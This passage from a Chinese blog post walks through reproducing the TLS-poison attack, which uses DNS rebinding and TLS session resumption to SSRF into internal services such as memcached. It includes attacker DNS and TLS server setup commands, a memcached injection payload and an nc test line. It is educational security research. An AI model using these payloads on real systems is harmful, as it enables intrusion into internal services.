YEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/6.jpg" alt=""></p><ol start="4"><li>最后，如果 Client 不校验本次获得的 ip 是否与上次一致，就会尝试与 127.0.0.1:25 进行 TLS Session Resumption ，也就是说， Client 会拿着攻击者特制的票据访问 127.0.0.1:25 ，尝试与之恢复 TLS 会话，这里就表现为 Client 发送含有 Payload 的 Client Hello 消息到 SMTP 服务器，至此完成一次 SSRF 攻击。</li></ol><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part1/7.jpg" alt=""></p><p>整体的流程图如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://raw.githubusercontent.com/jmdx/TLS-poison/master/diagram.svg" alt=""></p><p>这里再对图中进行一些解释：</p><ol><li>攻击者通过一些方式让受害者打开一个 HTML 页面，其中内容会向攻击者准备的 TLS Server <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a> 发起请求</li><li>当受害者打开这个页面后，受害者客户端会查询 ssltest.jmaddux.com 的 DNS 记录，最终会在攻击者准备的 DNS 服务器查询到攻击者提供的解析记录</li><li>此时 DNS 服务器正常返回结果为 TLS Server 地址并且 TTL 为 0 的响应</li><li>客户端发送 Client Hello 消息</li><li>服务端返回 Server Hello 消息，并在响应包中设置 session_id 为 payload</li><li>进行后续的TLS握手</li><li>握手完成后进行 http 通信时，攻击者 TLS Server 返回 301 跳转到 <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>受害者客户端重新加载 <a href="https://ssltest.jmaddux.com:11211" target="_blank" rel="noopener">https://ssltest.jmaddux.com:11211</a></li><li>理论上由于之前 DNS 响应的报文结果中 TTL 为 0 ，受害者客户端会再次向 DNS 服务器询问 ssltest.jmaddux.com 的解析结果</li><li>此时攻击者让 DNS 服务器返回解析结果为 127.0.0.1 且 TTL 为 0</li><li>接着由于 TLS 会话重用，受害者客户端会使用之前的 session_id 也就是 payload ，带着这个 payload 与 127.0.0.1:11211 进行 TLS 会话重用尝试</li><li>payload 被发送至 127.0.0.1:11211 ，达到攻击者目的，但是因为会话重用失败，受害者客户端会得到一个 TLS Error 的错误。至此完成所有攻击步骤。</li></ol><h3 id="Setup"><a href="#Setup" class="headerlink" title="Setup"></a>Setup</h3><p>好了，接下来就让我们自己动手试一试吧！由于我是使用的是两个 VPS ，没有像原作者一样使用 docker ，所以使用 docker 的同学还请自行摸索。并且由于国内复杂的网络环境，为了避免不必要的麻烦，我使用的是两台国外的 VPS 作为学习使用。</p><p>我准备的是一个域名、两台 VPS ，其中一台 VPS 作为 DNS 服务器，另外一台作为 TLS 服务器，两台 VPS 均是 ubuntu 20.04 LTS 。作者仓库对于各自 VPS 的准备工作已经介绍得比较全面了，详细可以参阅：<a href="https://github.com/jmdx/TLS-poison/#instructions" target="_blank" rel="noopener">https://github.com/jmdx/TLS-poison/#instructions</a> ，这里就不再赘述了。</p><p>唯一可能需要说一下的就是证书申请，这部分作者没有提到，为了避免一些同学不清楚的，可以参考一下，知道了的同学就可以跳过了。在 TLS 服务器上的证书准备工作：</p><ul><li>按照 <a href="https://certbot.eff.org/instructions" target="_blank" rel="noopener">https://certbot.eff.org/instructions</a> 安装对应的 cerbot </li><li>然后推荐使用 DNS changllenges 的方式弄证书，当然其他方式也可以。<code>certbot --manual --preferred-challenges dns certonly</code></li><li>按照自己的信息填好后，会提示需要到你的 DNS 域名管理商处增加一个 TXT 记录，直接添加上去就好了</li></ul><p>然后最后我们在域名的 DNS 上配置一下如下的基本设置，这里以域名为 example.com 举例：</p><table><thead><tr><th>Type</th><th>Name</th><th>Value</th></tr></thead><tbody><tr><td>A</td><td>dns</td><td>(Your DNS VPS IP)</td></tr><tr><td>NS</td><td>tls</td><td>dns.example.com</td></tr><tr><td>TXT</td><td>_acme-challenge</td><td>(这里是 cerbot 验证用的字符串)</td></tr></tbody></table><p>然后就先在 DNS VPS 上运行作者的 alternate-dns.py</p><p></p><figure class="highlight css hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-selector-tag">sudo</span> <span class="hljs-selector-tag">python3</span> <span class="hljs-selector-tag">alternate-dns</span><span class="hljs-selector-class">.py</span> <span class="hljs-selector-tag">tls</span><span class="hljs-selector-class">.example</span><span class="hljs-selector-class">.com</span>,127<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-selector-tag">-b</span> 0<span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.0</span> <span class="hljs-selector-tag">-t</span> <span class="hljs-selector-tag">Your_TLS_IP</span> <span class="hljs-selector-tag">-d</span> 8<span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span><span class="hljs-selector-class">.8</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>现在就万事俱备啦！</p><p>Let’s Try!</p><h3 id="Original-Method"><a href="#Original-Method" class="headerlink" title="Original Method"></a>Original Method</h3><p>接下来我们在 TLS VPS 进行一下操作，首先由于作者原来是使用的是 docker ，所以有些配置我们需要更改一下：</p><ul><li>在 client-hello-poisoning/custom-tls/src/main.rs#642 文件中，需要把<code>redis://redis/</code>更改为自己 TLS 服务器上的 redis 地址，比如默认的是 127.0.0.1:6379 ，这里我们就改成<code>redis://127.0.0.1:6379/</code></li><li>在原作者的方法中， payload 的设置需要在 redis 当中设置，所以我们可以在 redis 设置好 payload ，如：<code>set payload "\r\nset foo 0 0 12\r\ntls session \r\n"</code><ul><li>其中 payload 是 redis 当中的 key ，value 是真正发送给 memcached 的内容</li><li>Memcached 需要以 CRLF 作为整个命令的结束，并且可以忽略之前的语句错误，而原作者的文档中给出的 payload 是以 \r 结束，会导致写不进 memcached ，所以我们需要注意一下，我们这里可以使用<code>"\r\nset foo 0 0 13\ni in ur cache\r\n"</code>作为 payload 。<ul><li>这里如果要修改的话记得改 set 命令的第三个数字参数，该参数为设置数据的长度，否则也会发生错误写不进 memcahed，比如<code>i in ur cache</code>这里是 13 个字节，前面的第三个数字参数就需要为 13 ；前面的命令与数据间的换行我们可以使用 LF 作为换行，可以节省一个字节长度。</li><li>这里建议先使用<code>echo -e "\r\nset foo 0 0 13\ni in ur cache\r\n"|nc 127.0.0.1 11211</code>来尝试自己的 pyaload 是否能够写入 memcached ，这样如果后面失败了，对后面的排错很有用！至少能排除一个可能存在的问题！</li></ul></li></ul></li><li>在原作者的方法中，为了让 TLS 进行 Session Resumption ，作者使用了 HTTP 301 跳转的方式让 TLS 进行恢复会话，而跳转的地址则也需要我们通过 redis 来设置，设置的 key 为 redirect ，以 example.com 举例，我们可以这样进行设置：<code>set redirect  "https://tls.example.com:11211/"</code> 。（这里是原作者没有在文档中做出说明的地方，得需要阅读 main.rs 代码才能看出来）</li><li>还有一点就是作者还提供了一个延迟的选项，以免请求过快（这里有一些其他原因在此处，后续我们会分析到）。我们还是可以通过 redis 来设置 sleep 这个参数，可以达到延迟多少 ms 的效果，如果不设置的话，默认值为 2000 ms ，一般这个数值就可以了。</li></ul><p>我们这里以攻击本地的 memcached 为例，在 ubuntu 20.04 LTS 上默认使用<code>apt install memcached</code>安装完成之后，其默认监听在 11211 端口上。之后我们按照作者的说明，在 TLS VPS 上运行 TLSServer ：</p><p></p><figure class="highlight jboss-cli hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target/debug/custom-tls -p 11211 <span class="hljs-params">--verbose</span> <span class="hljs-params">--certs</span> <span class="hljs-string">/path/to/fullchain.pem</span> <span class="hljs-params">--key</span> <span class="hljs-string">/path/to/privkey.pem</span> http</span><br></pre></td></tr></tbody></table></figure><p></p><p>好了，现在才终于是一切准备就绪了，我们就可以直接使用 curl 进行测试了。这里为了直观查看 TLS Session Resumption 的效果，我们可以打开两个 wireshark 来观察，一个 wireshark 监听在你对外通信的网络接口上，一个 wireshark 监听在本地回环接口上。运行一下命令访问你的 TLSServer ：</p><p></p><figure class="highlight groovy hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="hljs-string">https:</span><span class="hljs-comment">//tls.example.com:11211/ -Lv</span></span><br></pre></td></tr></tbody></table></figure><p></p><p>PS: 注意这里需要加上<code>-L</code>参数允许 curl 进行重定向。</p><p>接着如果第一次 DNS 就把我们的域名解析到 127.0.0.1的话，可以多试几次直到域名解析到你的 TLS VPS IP 上为止，然后等待 1 min 左右，如果网络顺畅，一切顺利的话，在 1min 左右就可以完成本次攻击。攻击效果如下图所示：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/1.png" alt=""></p><p>其中可能会产生几种结果</p><ul><li>第一种最常见的结果就是<code>curl: (47) Maximum (50) redirects followed</code>，表示重定向次数已经超过了 curl 默认的最大深度 50 次，说明 DNS Rebinding 没有将 127.0.0.1 返回到给 Client ，这里因素也比较多，后文会提到，可以说运气比较差，多试几次就行了。</li><li>第二种结果是<code>curl: (35) error:1408F10B:SSL routines:ssl3_get_record:wrong version number</code>，如果上面的信息你还看到了<code>Trying 127.0.0.1</code>，那么恭喜你，很有可能这次就成功了，赶紧去 memcached 看看吧</li></ul><h3 id="The-Details-OF-Original-Method"><a href="#The-Details-OF-Original-Method" class="headerlink" title="The Details OF Original Method"></a>The Details OF Original Method</h3><p>在整理这篇文章之前，我也参考了很多文章，虽然这些文章没有明确的说明这个攻击的攻击载体，也就是 Payload 最大长度是 32 字节，但是都给了让我产生了一种先入为主的概念，在我印象当中它就只局限于 32 字节，然后我去详细去看作者公开的 PDF 时，发现作者在演示攻击 SMTP 时有一个图是这样的：</p><p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://cdn.jsdelivr.net/gh/ZeddYu/ZeddYu.github.io@master/images/tls-poison/Part2/2.jpg" alt=""></p><p>其中我们可以看到这个 payload 已经远远超过了 32 字节，然后我抱着疑惑去反复查看作者公布的演讲录像，其中他有这么说到（但愿我的英语听力以及 Youtube 字幕足够准确）：</p><blockquote><p>​    It might seem too good to be ture but TLS actually provides us exactly that in the form of a session id. Most clients even persist this field for later use. Session ids are limited to 32 bytes as you can see but depending on the implementation you might have session ticket. This one is about 200 bytes but these can be up to around 65 kilobytes. But session ids and session tickets are mechanisms for a TLS client to go. Remember that cryptographic key exchange we did earlier let’s just keep using that key in this new connection. TLS 1.3 includes a slightly more complicated but similar mechanism called a pre-shared key identity which pretty much does the smae thing for our purposes. All of these are about optimization since key exchange can be time consuming. But they provide a certain way for a server to tell whatever is connecting to it to persist some data for lighter use, almost like a cookie that lives in plain text. So it’s perfect for the surf attack we’re trying to do.</p></blockquote><p>也就是说这个攻击本来就可以做到超过 32 字节的做法，也就是我们之前所说的那几种 Session Resumption ，只有 SessionID 局限于 32 